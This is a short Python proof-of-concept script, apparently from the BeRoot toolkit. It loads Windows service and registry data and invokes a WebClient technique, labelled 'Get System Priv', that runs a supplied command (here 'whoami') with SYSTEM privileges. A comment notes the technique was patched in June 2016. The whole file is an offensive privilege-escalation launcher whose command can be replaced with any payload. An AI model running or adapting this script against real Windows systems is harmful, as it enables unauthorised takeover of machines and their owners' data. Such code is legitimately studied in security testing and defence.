# -*- coding: utf-8 -*-
from beroot.modules.checks.webclient.webclient import WebClient
from beroot.modules.get_info.from_scmanager_services import GetServices
from beroot.modules.get_info.from_registry import Registry


class Poc(object):

    def __init__(self):

        # Load info from registry
        r = Registry()
        self.service = r.get_services_from_registry()
        self.startup = r.get_sensitive_registry_key()

        # Load info using the SCManager
        s = GetServices()
        self.service = s.get_services(self.service)

    def check_webclient(self, cmd):
        """
        This technique has been patched on June 2016
        """
        print('-------------- Get System Priv with WebClient --------------\n')

        w = WebClient()
        w.run(self.service, cmd)

cmd='whoami'
Poc().check_webclient(cmd)